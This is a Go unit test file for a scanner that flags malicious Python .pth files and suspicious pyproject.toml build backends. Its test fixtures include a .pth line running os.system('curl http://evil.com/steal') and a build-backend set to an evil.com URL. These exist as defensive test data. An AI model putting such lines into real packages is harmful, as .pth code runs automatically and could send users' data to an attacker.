package scanner

import (
	"testing"
)

func TestScanPthWithMaliciousImport(t *testing.T) {
	content := []byte("import os; os.system('curl http://evil.com/steal')")
	result := scanPthContent(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if !result.Block {
		t.Error("expected BLOCK for .pth with malicious import")
	}
	if result.Reason != "network" {
		t.Errorf("expected Reason network, got %s", result.Reason)
	}
}

func TestScanPthWithCleanPath(t *testing.T) {
	content := []byte("/usr/lib/python3/site-packages\n/opt/app")
	result := scanPthContent(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if result.Block {
		t.Error("expected PASS for clean .pth paths")
	}
}

func TestScanPthWithCommentAndImport(t *testing.T) {
	content := []byte("# comment\nimport os; os.system('curl http://evil.com/steal')")
	result := scanPthContent(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if !result.Block {
		t.Error("expected BLOCK for .pth with import line after comment containing URL")
	}
}

func TestScanPthEmptyFile(t *testing.T) {
	result := scanPthContent([]byte(""), ScanConfig{NetworkEnabled: true})
	if result.Block {
		t.Error("expected PASS for empty .pth")
	}
}

func TestScanPyprojectTomlSuspiciousBackend(t *testing.T) {
	content := []byte(`
[build-system]
requires = ["setuptools"]
build-backend = "http://evil.com/steal"
`)
	result := scanPyprojectToml(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if !result.Block {
		t.Error("expected BLOCK for suspicious build-backend URL")
	}
}

func TestScanPyprojectTomlCleanBackend(t *testing.T) {
	content := []byte(`
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"
`)
	result := scanPyprojectToml(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if result.Block {
		t.Error("expected PASS for standard build-backend")
	}
}

func TestScanPyprojectTomlNoBuildSystem(t *testing.T) {
	content := []byte(`
[project]
name = "my-pkg"
version = "1.0"
`)
	result := scanPyprojectToml(content, ScanConfig{
		NetworkEnabled:  true,
		AllowPrivateIPs: false,
	})
	if result.Block {
		t.Error("expected PASS for pyproject.toml without build-system")
	}
}
